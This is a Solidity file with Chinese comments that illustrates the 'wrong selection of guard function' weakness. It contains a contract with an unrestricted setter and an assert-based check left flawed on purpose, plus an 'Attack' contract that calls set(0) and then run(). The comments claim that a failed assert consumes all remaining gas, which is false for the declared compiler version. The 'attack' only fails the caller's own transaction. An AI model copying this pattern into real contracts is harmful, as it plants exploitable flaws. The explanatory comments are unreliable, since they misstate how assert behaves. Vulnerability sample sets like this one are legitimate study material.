// Solidity Version >=0.8.0
pragma solidity >=0.8.0;

// 漏洞名稱：Wrong Selection of Guard Function
// 此漏洞在於使用 assert 作為 guard 條件，並且在建構子中未正確利用輸入參數，
// 使得狀態變數 param 被初始化為 0，當後續呼叫 run() 時會因 assert(param > 0) 失敗，
// 一旦觸發 assert 失敗，會導致剩餘的 gas 全部消耗，進而造成服務中斷或其他不預期的效果。

contract AssertMultiTx2 {
    // 狀態變數，漏洞重點：允許攻擊者透過 set() 函式任意修改
    uint256 private param; 

    // 建構子：漏洞在此，無視輸入參數，故強制將 param 設為 0
    constructor(uint256 _param) {
        // 漏洞：未使用 _param，直接將 param 設為 0，導致後續 invariant 驗證失敗
        param = 0;
    }

    // 可被攻擊者呼叫以更改狀態變數 param
    function set(uint256 _param) public {
        param = _param;
    }

    // 漏洞函式：使用 assert 來檢查狀態，但當 param <= 0 時，assert 將觸發，消耗所有 gas
    function run() public {
        assert(param > 0);
    }
}

// 攻擊合約範例：此合約示範如何利用上述漏洞進行攻擊，
// 攻擊者可以透過呼叫 set() 將 param 變回 0，再呼叫 run() 使 assert 失敗，導致 gas 耗盡。
contract Attack {
    AssertMultiTx2 public vulnerable;

    // 部署攻擊合約時需傳入漏洞合約的地址
    constructor(address _vulnerableAddress) {
        vulnerable = AssertMultiTx2(_vulnerableAddress);
    }

    // 攻擊流程：
    // 1. 呼叫 set(0) 保證 param 為 0
    // 2. 呼叫 run()，觸發 assert 失敗，造成 gas 消耗及執行中斷
    function attack() public {
        vulnerable.set(0);
        vulnerable.run();
    }
}
